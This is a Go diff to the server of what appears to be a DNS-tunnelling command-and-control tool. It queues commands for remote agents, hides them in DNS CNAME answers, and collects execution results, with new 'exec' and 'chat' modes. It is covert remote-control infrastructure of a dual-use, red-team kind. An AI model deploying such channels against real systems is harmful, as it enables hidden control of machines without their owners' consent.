@@ -36,7 +36,7 @@ var dedupHashTable = make(map[uint64]bool)
 type agentStatusForServer struct {
 	LastAckFromAgentServerTime      uint32
 	LastAckFromAgentPacketTime      uint32
-	NextMessageType                 c2.MessageType
+	NextMessageType                 c2.MsgType
 	NextParentPartId                uint16
 	HealthCheckIntervalMilliSeconds uint32
 }
@@ -45,7 +45,8 @@ type agentStatusForServer struct {
 var ConnectedAgents = make(map[string]agentStatusForServer)
 var CommandWriter io.Writer
 
-// log received healthcheck
+// log received healthcheck. if the agent is due to run a task, the server's response
+// to the healthcheck will become different.
 func MessageHealthcheckHandler(Packet c2.MessagePacketWithSignature, q *dns.Msg) error {
 	log.Infof("Healthcheck, coming from %s", Packet.Signature)
 	//register new agent in agent list
@@ -63,7 +64,8 @@ func MessageHealthcheckHandler(Packet c2.MessagePacketWithSignature, q *dns.Msg)
 	agent.LastAckFromAgentPacketTime = Packet.Msg.TimeStamp
 	agent.LastAckFromAgentServerTime = uint32(time.Now().Unix())
 	ConnectedAgents[Packet.Signature.String()] = agent
-	if agent.NextMessageType == c2.MessageHealthcheck { // no one else has claimed a new command for this agent, so I'm gonna go ahead and do the routine task and respond with a Pong
+	switch agent.NextMessageType {
+	case c2.MessageHealthcheck: // no one else has claimed a new command for this agent, so I'm gonna go ahead and do the routine task and respond with a Pong
 		payload := []byte("Pong!")
 		// check time difference between packet time nad server time. anything after 10 seconds is unacceptable
 		// todo: fix this before removing the comment
@@ -94,42 +96,21 @@ func MessageHealthcheckHandler(Packet c2.MessagePacketWithSignature, q *dns.Msg)
 			}
 			q.Answer = append(q.Answer, cname)
 		}
-		// the MessageExecuteCommand here would only happen for the first packet. after this it's gonna be handled elsewhere
-	} else if agent.NextMessageType == c2.MessageExecuteCommand { // we should check the buffer for this public key and pop the item in order and send it through
+		// this only happens when we're switching mode. after this one, the rest of the requests
+		// won't be coming in as healthcheck originally, so won't be hitting this function altogether
+	case c2.MessageExecuteCommand:
 		// todo: let's see if we can send two commands here, one payload and another for adjusting the interval
+		// first check to see if this is a residual packet from a previous multi-part convo
+		if len(outgoingBuffer[Packet.Signature.String()][agent.NextParentPartId]) == 0 {
+			return nil
+
+		}
 		cname, err := dns.NewRR(fmt.Sprintf("%s CNAME %s", q.Question[0].Name, outgoingBuffer[Packet.Signature.String()][agent.NextParentPartId][0])) //todo:fix the 0 index
 		if err != nil {
 			log.Warnf("Error: %v", err) //todo:fix
 		}
 		q.Answer = append(q.Answer, cname)
-
-		// todo: cleanup if it's more than one part (potentially this will work?)
 	}
-
-	return nil
-}
-
-func MessageGetFileFromAgnet(payload []byte, firstPacket c2.MessagePacketWithSignature) error {
-	// if ParentPartID = 0 -> single packet
-	// if ParentPartID != 0 -> incoming packets in the order of their PartID
-	// if IsLastPart == true -> last packet
-	// successful request incoming, need to see which packet are we dealing with
-	// if o.Msg.ParentPartID != 0 { // multi part
-	// 	//fist and middle packets
-	// 	handler.packetBuffersWithSignature[int(o.Msg.ParentPartID)] = append(handler.packetBuffersWithSignature[int(o.Msg.ParentPartID)], o)
-	// 	if o.Msg.IsLastPart {
-	// 		executeFunction(handler.packetBuffersWithSignature[int(o.Msg.ParentPartID)])
-	// 	}
-	// 	//todo: prepare response
-	// 	return nil
-	// } else { // single packet
-	// 	executeFunction([]c2.MessagePacketWithSignature{o})
-	// 	// todo: prepare response
-	// }
-	return nil
-}
-
-func SendFileToAgent(payload []byte, firstPacket c2.MessagePacketWithSignature) error {
 	return nil
 }
 
@@ -143,10 +124,13 @@ func displayCommandResult(fullPayload []byte, signature *cryptography.PublicKey)
 		out, _ = io.ReadAll(r)
 	}
 	log.Infof("Command result: %s", out)
-	fmt.Fprintf(CommandWriter, "command result coming from %s:\n%s\n------\n", signature.String(), string(out))
+	// we only need the result printed in exec mode. in echo mode, this is just a "sent" tickbox
+	if conf.GlobalServerConfig.Mode == "exec" {
+		fmt.Fprintf(CommandWriter, "command result coming from %s:\n%s\n------\n", signature.String(), string(out))
+	}
 }
 
-func HandleRunCommandResFromAgent(Packet c2.MessagePacketWithSignature, q *dns.Msg) error {
+func HandleExecuteCommandResponse(Packet c2.MessagePacketWithSignature, q *dns.Msg) error {
 	_, ok := ConnectedAgents[Packet.Signature.String()]
 	if !ok {
 		log.Errorf("Agent not recognized")
@@ -157,7 +141,7 @@ func HandleRunCommandResFromAgent(Packet c2.MessagePacketWithSignature, q *dns.M
 	//fist and middle packets
 	msg := c2.MessagePacket{
 		TimeStamp:    uint32(time.Now().Unix()),
-		MessageType:  c2.MessageExecuteCommandRes,
+		MessageType:  c2.MessageExecuteCommandResponse,
 		ParentPartID: Packet.Msg.ParentPartID,
 		PartID:       Packet.Msg.PartID,
 	}
@@ -199,16 +183,9 @@ func HandleRunCommandResFromAgent(Packet c2.MessagePacketWithSignature, q *dns.M
 	return nil
 }
 
-// handle the Server switching an agent's status to run command with a payload, puts the agent's status to run command so we handle it next time the healthcheck arrives
-func RunCommandOnAgent(agentPublicKey *cryptography.PublicKey, command string) error {
-	log.Infof("invoking command '%s' for the client", command)
-	fmt.Fprintf(CommandWriter, "invoking command '%s' on %s\n", command, agentPublicKey.String())
-	msg := c2.MessagePacket{
-		TimeStamp:   uint32(time.Now().Unix()),
-		MessageType: c2.MessageExecuteCommand,
-	}
+func MustSendMsg(msgPacket c2.MessagePacket, agentPublicKey *cryptography.PublicKey, msg string) error {
 	// As part of the incoming packet, we'll get the partid as well as parentPartId so we know which part to send next. we just need to cache the whole partition up
-	Answers, parentPartId, _ := c2.PreparePartitionedPayload(msg, []byte(command), conf.GlobalServerConfig.DnsSuffix, conf.GlobalServerConfig.PrivateKey, agentPublicKey)
+	Answers, parentPartId, _ := c2.PreparePartitionedPayload(msgPacket, []byte(msg), conf.GlobalServerConfig.DnsSuffix, conf.GlobalServerConfig.PrivateKey, agentPublicKey)
 	//todo: single part messages always have parentPartId = 0, so we need to check if it's single part or multi part and probably don't cache
 	//todo: what are we getting from the client? let's decrypt and log those
 
@@ -232,11 +209,71 @@ func RunCommandOnAgent(agentPublicKey *cryptography.PublicKey, command string) e
 
 	// set NextMessageType to let the healthcheck responder know
 	agent := ConnectedAgents[agentPublicKey.String()]
-	agent.NextMessageType = c2.MessageExecuteCommand
+	agent.NextMessageType = msgPacket.MessageType
 	agent.NextParentPartId = parentPartId
 	ConnectedAgents[agentPublicKey.String()] = agent
 	// todo: potentially a channel to notify the changes to agent's status and flick it to true when this happens?
 	// todo: set interval before returning the packet
+	return nil
+}
+
+// handle the Server switching an agent's status to run command with a payload, puts the agent's status to run command so we handle it next time the healthcheck arrives
+// the input of this function comes directly from TUI input field. it was renamed
+// because it'll now consider they message type as a configuration item and
+// can provide command execution as well as chat.
+func SendMessageToAgent(agentPublicKey *cryptography.PublicKey, command string) error {
+	fmt.Fprintf(CommandWriter, "sending message '%s' on %s\n", command, agentPublicKey.String())
+	var cmdType c2.CmdType
+	if conf.GlobalServerConfig.Mode == "chat" {
+		cmdType = c2.CommandEcho
+	}
+	if conf.GlobalServerConfig.Mode == "exec" {
+		cmdType = c2.CommandExec
+	}
+	msg := c2.MessagePacket{
+		TimeStamp:   uint32(time.Now().Unix()),
+		MessageType: c2.MessageExecuteCommand,
+		Command:     cmdType,
+	}
+	return MustSendMsg(msg, agentPublicKey, command)
+}
+
+func MessageChatHandler(Packet c2.MessagePacketWithSignature, q *dns.Msg) error {
+	agent := ConnectedAgents[Packet.Signature.String()]
+	acknowledgedId := Packet.Msg.PartID
+	// handle last packet ID
+	if uint16(len(outgoingBuffer[Packet.Signature.String()][agent.NextParentPartId])) == acknowledgedId {
+		return nil
+	}
+	if Packet.Msg.IsLastPart || Packet.Msg.ParentPartID == 0 {
+		// reset the agent status to healthcheck and clean the buffer
+		agent.NextMessageType = c2.MessageHealthcheck
+		delete(outgoingBuffer[Packet.Signature.String()], agent.NextParentPartId)
+		return nil
+	}
+	cname, err := dns.NewRR(fmt.Sprintf("%s CNAME %s", q.Question[0].Name, outgoingBuffer[Packet.Signature.String()][agent.NextParentPartId][acknowledgedId+1]))
+	if err != nil {
+		log.Warnf("Error: %v", err) //todo:fix
+	}
+	// todo: go back to the healthcheck handler and send the next packet
+	// todo: print output
+	q.Answer = append(q.Answer, cname)
+	// log.Infof("sending chat message '%s' to the client", command)
+	//msg := c2.MessagePacket{
+	//	TimeStamp:   uint32(time.Now().Unix()),
+	//	MessageType: c2.MessageChat,
+	//}
+	//return MustSendMsg(msg, agentPublicKey, c2.MessageChat, command)
+	return nil
+}
+
+func MessageChatResResHandler(Packet c2.MessagePacketWithSignature, q *dns.Msg) error {
+	// we only get this when the message's last part have been received and parsed.
+	// just need to switch back the agent to healthcheck mode
+	agent := ConnectedAgents[Packet.Signature.String()]
+	agent.NextMessageType = c2.MessageHealthcheck
+	ConnectedAgents[Packet.Signature.String()] = agent
+
 	return nil
 
 }
@@ -298,22 +335,6 @@ func MessageSetHealthIntervalHandler(Packet c2.MessagePacketWithSignature, q *dn
 	return nil
 }
 
-// func executeFunction(packets []c2.MessagePacketWithSignature) error {
-// 	fullPayload := make([]byte, 0)
-// 	packets = c2.CheckMessageIntegrity(packets)
-// 	for _, packet := range packets {
-// 		packetPayload := packet.Msg.Payload[:]
-// 		fullPayload = append(fullPayload, packetPayload...)
-// 	}
-// 	log.Warnf("%s, coming from %s\n", fullPayload, packets[0].Signature.String())
-// 	// todo: clean the memory for this parentpartID
-// 	return nil
-// }
-
-// func cleanupBuffer(timeout time.Duration) error {
-// 	return nil //todo
-// }
-
 func isMsgDuplicate(data []byte) bool {
 	// dedup checks
 	skipForDudup := false
@@ -345,12 +366,8 @@ func parseQuery(m *dns.Msg) error {
 			return MessageHealthcheckHandler(o, m)
 		case c2.MessageExecuteCommand:
 			return HandleRunCommandAckFromAgent(o, m)
-		case c2.MessageExecuteCommandRes:
-			return HandleRunCommandResFromAgent(o, m)
-		case c2.MessageClientGetFile:
-			return nil // todo
-		case c2.MessageClientSendFile:
-			return nil // todo
+		case c2.MessageExecuteCommandResponse:
+			return HandleExecuteCommandResponse(o, m)
 		case c2.MessageSetHealthInterval:
 			return nil //
 		case c2.MessageSyncTime:
@@ -400,7 +417,9 @@ func RunServer(cmd *cobra.Command, args []string) {
 	// set global flag that we're running as server
 	conf.Mode = conf.RunAsServer
 	log.SetLevel(log.Level(conf.GlobalServerConfig.LogLevel))
-
+	if conf.GlobalAgentConfig.LogLevel == uint8(log.DebugLevel) {
+		log.SetReportCaller(true)
+	}
 	if conf.GlobalServerConfig.LogFile != "" {
 		f, err := os.OpenFile(conf.GlobalServerConfig.LogFile, os.O_RDWR|os.O_CREATE|os.O_APPEND, 0666)
 		if err != nil {
